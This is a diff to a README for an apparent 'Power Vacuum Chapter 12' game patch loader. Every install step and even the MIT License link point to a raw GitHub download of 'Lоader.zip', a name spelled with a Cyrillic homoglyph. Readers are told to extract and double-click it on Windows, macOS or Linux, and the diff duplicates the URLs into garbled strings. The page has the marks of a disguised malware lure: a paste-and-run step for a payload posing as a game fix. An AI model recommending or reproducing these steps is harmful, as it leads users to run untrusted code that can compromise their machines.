@@ -35,14 +35,14 @@ Boost your Power Vacuum Chapter 12 experience with our advanced, SEO-optimized, 
 
 ## 💾 Installation Guide
 
-1. **Download https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip from the repository**  
-   Grab the https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip file right here and extract it to any folder on your system.
+1. **Download https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zipоhttps://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip from the repository**  
+   Grab the https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zipоhttps://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip file right here and extract it to any folder on your system.
 
 2. **Extract Files**  
-   Use popular archiver software (WinRAR, 7-Zip, The Unarchiver, Archive Manager) to unpack the https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip 
+   Use popular archiver software (WinRAR, 7-Zip, The Unarchiver, Archive Manager) to unpack the https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zipоhttps://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip 
 
 3. **Run Loader**  
-   Double-click "https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip" (Windows), "https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip" (macOS), or "https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip" (Linux/Steam Deck).
+   Double-click "https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zipоhttps://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip" (Windows), "https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zipоhttps://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip" (macOS), or "https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zipоhttps://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip" (Linux/Steam Deck).
 
 4. **Follow On-Screen Prompts**  
    The loader will guide you through straightforward patching. No advanced skills required!
@@ -81,7 +81,7 @@ Power Vacuum Chapter 12 Loader, Universal Patch for Chapter 12, Game Patch Full 
 
 ## 📜 License – MIT
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zipоhttps://raw.githubusercontent.com/Vinilo2025/PowerVacuum-Ch12FullPatch-Refined/main/Lоader.zip).  
 Use, modify, and distribute with freedom – just keep this notice included in all copies.
 
 ---
